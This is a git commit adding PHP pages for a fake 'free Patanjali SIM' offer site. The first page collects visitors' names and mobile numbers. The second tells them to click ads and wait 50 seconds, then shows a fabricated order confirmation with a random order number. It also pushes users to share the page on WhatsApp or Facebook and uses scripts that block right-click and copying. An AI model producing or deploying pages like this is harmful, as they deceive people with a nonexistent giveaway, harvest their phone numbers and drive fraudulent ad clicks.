7d246b1f14a1d5b0f7e007670d22963862817645
Utkarsh Tiwari <utiwari914@gmail.com>
2018-06-22 16:52:33 +0530

    Add offer site

---
+++ public_html/final.php
@@ -0,0 +1,159 @@
+
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+ <meta property="og:locale" content="en" />
+<title>ORDER PATANJALI SIM FOR FREE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Order Now Free 2 Day Delivery" />
+    <meta property="og:url" content="index.php" />
+    <meta property="og:description" content="ORDER FOR FREE NOW" />
+    <meta property="og:site_name" content="PATANJALI SIM FOR FREE" />
+    <meta property="og:image" content="https://3.bp.blogspot.com/-Z7xBOXMfu6Y/WxDmGHzyFjI/AAAAAAAAANA/_XshkIROpSMco0d0ecwa3LvI6Kw3ANPXACEwYBhgL/s640/patanjali-sim-card-offers%2Bcopy.png"/>
+    <link rel="shortcut icon" href="https://3.bp.blogspot.com/-Z7xBOXMfu6Y/WxDmGHzyFjI/AAAAAAAAANA/_XshkIROpSMco0d0ecwa3LvI6Kw3ANPXACEwYBhgL/s640/patanjali-sim-card-offers%2Bcopy.png" type="image/x-icon">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="style.css"/>
+<link rel="stylesheet" href="../www.w3schools.com/w3css/4/w3.css">
+</head>
+	<SCRIPT language=JavaScript>
+
+
+var message = "You have not Permission to This";
+
+function rtclickcheck(keyp){ if (navigator.appName == "Netscape" && keyp.which == 3){ alert(message); return false; }
+
+if (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2) { alert(message); return false; } }
+
+document.onmousedown = rtclickcheck;
+
+</SCRIPT><script>
+document.onkeydown = function(e) {
+        if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
+            
+        }
+        return false;
+};
+</script>
+<script>
+function setCookie(cname, cvalue, exdays) {
+var d = new Date();
+d.setTime(d.getTime() + (exdays*24*60*60*1000));
+var expires = "expires="+d.toUTCString();
+document.cookie = cname + "=" + cvalue + "; " + expires;
+}
+
+function getRandomString()
+{
+  var text = "";
+  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+  for (var i = 0; i < 5; i++)
+    text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+  return text;
+}
+
+
+function getCookie(cname) {
+var name = cname + "=";
+var ca = document.cookie.split(';');
+for(var i=0; i<ca.length; i++) {
+var c = ca[i];
+while (c.charAt(0)==' ') c = c.substring(1);
+if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
+}
+return 0;
+}
+var c=getCookie("clicks");
+function fn1(x)
+{
+++c;
+setCookie("clicks",c,4);
+if(false && c < 4)
+{
+window.alert("You have not open our offer link in your mobile.\n Please open it.");
+}
+else
+window.alert("Congratulations \n\n & Thank you Using Our Site. \n\nWe have received your Free Patanjali SIM request. \n\nYour order number is "+getRandomString()+". \n\Order Delivery will be completed in the next 2 Days.\n\nIf you haven't shared on whatsapp or facebook, you will not get Jio Phone.\n\nRemember : Don't delete the messages or post until order confirmation.")
+}
+</script>
+
+<script type="text/javascript">navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;navigator.vibrate([1000, 500]);</script>       
+    </head>
+    
+
+<body>
+<div class="content">
+ 
+    
+<div class="container2">
+<header>
+    <div class="h_logo">
+        <img src="https://3.bp.blogspot.com/-Z7xBOXMfu6Y/WxDmGHzyFjI/AAAAAAAAANA/_XshkIROpSMco0d0ecwa3LvI6Kw3ANPXACEwYBhgL/s640/patanjali-sim-card-offers%2Bcopy.png" height="auto" />
+    </div>
+    <h1><b>Free voice and digital freedom for all Patanjali SIM users</b></h1>	
+</header>
+
+
+<div class="container">
+    <center><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-4013945096721034",
+          enable_page_level_ads: true
+     });
+</script></center>
+<center></center>
+ <center>
+<center>      		
+                <b>
+
+                
+                         <font color="red">1. Click Any Ads In This Page And W8 50 Sec.</font><br><br>
+                         <font color="green"> 2. Then Come Back And Click On Confirm My Order Now.</font>
+
+
+                    </p>
+                    
+              
+               
+
+                <div class="form-step">
+		      
+            	
+		 
+                    <a style="width:100%; text-align:center; display:block" target="_blank"  href="javascript:return void(0);" class="whatsapp" target="_blank"
+ onClick="javascript:window.open('http://mobgyan.com');"
+ id="signInSubmit" unselectable="on"> 
+                    </a><br><br>
+                    <center><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-4013945096721034",
+          enable_page_level_ads: true
+     });
+</script></center>
+                 <br><br>
+  <a style="width:80%; text-align:center; display:block; margin-top:10px;" class="step last" onclick="fn1(this)">
+                        Confirm My Order Now    
+                    </a>
+
+ <center>
+<br>
+<MARQUEE BEHAVIOR=SCROLL>
+<font color="red"><b>(Share it more and more so that everyone can benefit from this scheme.)<b></b></font></MARQUEE>
+</center>  
+
+ <center><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-4013945096721034",
+          enable_page_level_ads: true
+     });
+</script></center>
+
+
+</body>
+</html>
---
+++ public_html/index.php
@@ -0,0 +1,84 @@
+
+
+<html lang="en">
+
+
+<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+ <meta property="og:locale" content="en" />
+<title>ORDER PATANJALI SIM FOR FREE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Order Now Free Jio Phone 2 Day Delivery" />
+    <meta property="og:url" content="index.php" />
+    <meta property="og:description" content="ORDER FOR FREE NOW" />
+    <meta property="og:site_name" content="PATANJALI SIM FOR FREE" />
+    <meta property="og:image" content="https://3.bp.blogspot.com/-Z7xBOXMfu6Y/WxDmGHzyFjI/AAAAAAAAANA/_XshkIROpSMco0d0ecwa3LvI6Kw3ANPXACEwYBhgL/s640/patanjali-sim-card-offers%2Bcopy.png"/>
+    <link rel="shortcut icon" href="/sicon.png" type="image/x-icon">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="../www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" type="text/css" href="style.css"/>
+</head>
+<body>
+<div class="content">
+ 
+    
+<div class="container2">
+<header>
+    <div class="h_logo">
+        <img src="https://3.bp.blogspot.com/-Z7xBOXMfu6Y/WxDmGHzyFjI/AAAAAAAAANA/_XshkIROpSMco0d0ecwa3LvI6Kw3ANPXACEwYBhgL/s640/patanjali-sim-card-offers%2Bcopy.png" height="auto" />
+    
+    <h1><b>Free voice and digital freedom for all Patanjali SIM users</b></h1>	</div>
+</header>
+
+
+
+<div class="container">
+<center>
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-4013945096721034",
+          enable_page_level_ads: true
+     });
+</script>
+</center>
+  <form action="./next.php" method="get">
+<br>
+    <b>Your Full Name</b>
+    <input type="text" id="name" name="" placeholder="Enter Your Full Name..." Title="Enter Your Full Name" required>
+
+    <b>Your Active Number</b>
+    <input type="text" id="number" name="m" placeholder="Enter Your Active Mobile Number..." pattern="[7-9]{1}[0-9]{9}" maxlength="10" minlength="10" Title="Please enter valid phone number" required>
+
+    
+
+
+
+                <center><button class="button new btn-lg round" style="width:80%" align="center" type="submit"><i class="fa fa-hand-o-right" aria-hidden="true">&nbsp;</i><b>Next</b></button></center>
+        
+</form>
+ <center>
+     <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-4013945096721034",
+          enable_page_level_ads: true
+     });
+</script><br>
+ </center>
+ <br>
+<center>
+<script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1483007,"000000","ffffff");</script>
+
+</center>
+
+
+
+
+</div>
+</div>
+
+</div>
+</body>
+
+</html>
